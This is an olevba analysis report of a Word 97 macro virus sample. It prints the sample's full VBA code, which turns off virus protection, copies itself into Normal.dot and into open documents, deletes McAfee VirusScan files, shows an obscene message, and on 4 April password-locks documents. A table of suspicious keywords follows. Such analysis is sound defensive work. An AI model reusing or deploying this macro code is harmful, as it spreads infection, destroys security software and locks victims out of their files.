olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bausatz-based
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bausatz-based - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub autoexit()
On Error Resume Next
'Made with the W97 MakroVirus Bausatz by MagBee
ActiveDocument.ReadOnlyRecommended = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Application.DisplayAlerts = wdAlertsNone
Application.EnableCancelKey = wdCancelDisabled
Application.DisplayStatusBar = False
Options.ConfirmConversions = False
Application.ScreenUpdating = False
If ThisDocument.Name = "Normal.dot" Then
Set Source = NormalTemplate.VBProject.VBComponents(1).CodeModule
Set Target = ActiveDocument.VBProject.VBComponents(1).CodeModule
Else
Set Source = ActiveDocument.VBProject.VBComponents(1).CodeModule

Set Target = NormalTemplate.VBProject.VBComponents(1).CodeModule
End If
With Source
vircode = .lines(1, .countoflines)
End With
With Target
.deletelines 1, .countoflines
.insertlines 1, vircode
End With

Kill ("c:\Programme\Mcafee\VirusScan\*.*")



MsgBox "Fuck you", , "W97M Virus Bausatz by MagBee"


If Day(Now()) = 4 And Month(Now()) = 4 Then
If ActiveDocument.HasPassword = False Then ActiveDocument.Password = "krt"
End If









ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, fileformat:=wdFormatDocument






End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexit            |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

